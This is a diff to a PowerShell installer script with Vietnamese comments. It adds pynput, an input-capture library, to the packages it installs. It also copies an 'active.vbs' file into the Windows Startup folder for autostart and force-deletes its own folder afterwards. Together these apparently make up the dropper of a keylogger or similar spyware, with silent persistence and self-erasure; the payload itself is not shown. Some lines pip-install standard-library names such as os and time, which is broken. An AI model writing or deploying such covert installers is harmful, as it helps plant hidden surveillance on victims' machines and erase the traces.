@@ -23,7 +23,7 @@ if ( -not (Get-command python -errorAction SilentlyContinue)){
   pip install datetime
   pip install time
   pip install selenium
-
+  pip install pynput
 }else{
    pip install os
   pip install datetime
@@ -53,4 +53,7 @@ $sourceFolder =  $PSScriptRoot +"\active.vbs"
 $dich= $destinationFolder+"\Startup"
 # Write-Host "Thư mục hiện tại đang đứng: $PSScriptRoot"
 Copy-Item -Path $sourceFolder -Destination $dich -Force | Out-Null
-Remove-Item -Path $PSScriptRoot -Recurse -Force
+
+if(Test-Path $PSScriptRoot){
+ Remove-Item -Path $PSScriptRoot -Recurse -Force
+}
